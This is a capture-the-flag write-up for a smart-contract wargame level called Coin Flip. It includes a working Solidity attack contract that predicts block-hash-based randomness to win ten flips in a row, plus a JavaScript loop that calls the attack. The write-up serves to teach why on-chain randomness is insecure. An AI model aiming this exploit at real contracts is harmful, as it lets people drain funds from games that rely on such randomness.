# Level 3: Coin Flip

## Challenge Overview

The `CoinFlip` challenge demonstrates how on-chain randomness can be exploited.  
The goal is to correctly guess the outcome of a coin flip multiple times in a row.

## Goal

Win the coin flip 10 times consecutively

## Solution

The `CoinFlip` contract relies on block hashes to determine the coin flip outcome:

```solidity
bool side = uint256(blockhash(block.number - 1)) % 2 == 0;
```

Since block hashes are deterministic, you can predict the outcome by replicating the logic off-chain.

### 1. Deploy an attack contract on REMIX IDE (I used Sepolia testnet):

```solidity
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public target;
    uint256 lastHash;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue % 2 == 0;
        target.flip(guess);
    }
}
```

### 2. Call the `attack` function repeatedly to win 10 flips:

```javascript
for (let i = 0; i < 10; i++) {
    await attack.attack();
}
```

---

## Lessons Learned

- On-chain randomness is not secure because block data is deterministic.
- The ideal practice is to use off-chain oracles like Chainlink VRF for secure randomness.
